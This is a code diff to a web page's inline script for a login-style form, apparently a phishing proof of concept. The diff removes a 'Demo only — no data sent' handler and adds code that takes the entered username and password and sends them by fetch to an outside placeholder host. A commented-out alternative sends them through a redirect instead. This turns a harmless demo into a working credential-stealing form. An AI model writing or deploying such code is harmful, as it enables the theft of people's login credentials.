@@ -70,21 +70,29 @@
   <script>
     (function(){
       var form = document.getElementById('poc-form');
-      var status = document.getElementById('status');
+
       form.addEventListener('submit', function(e){
         e.preventDefault();
-        status.textContent = 'Demo only — no data sent.';
-        setTimeout(function(){
-          document.getElementById('u').value = '';
-          document.getElementById('p').value = '';
-        }, 150);
+
+        var username = encodeURIComponent(document.getElementById('u').value);
+        var password = encodeURIComponent(document.getElementById('p').value);
+
+        // שליחה ב-HTTP GET
+        var targetUrl = `https://someurl/u=${username}&p=${password}`;
+        
+        // אפשרות 1: שליחה בשיטת fetch (נשאר בעמוד)
+        fetch(targetUrl)
+          .then(response => console.log('Data sent:', response.status))
+          .catch(err => console.error('Error sending data:', err));
+
+        // אפשרות 2: ניתוב ישיר לכתובת (Redirect)
+        // window.location.href = targetUrl;
+
+        // ניקוי שדות
+        document.getElementById('u').value = '';
+        document.getElementById('p').value = '';
       });
-      document.addEventListener('keydown', function(e){
-        if (e.key === 'Escape') {
-          var card = document.querySelector('.card');
-          if (card) card.classList.add('hidden');
-        }
-      });
+
     })();
   </script>
 </body>
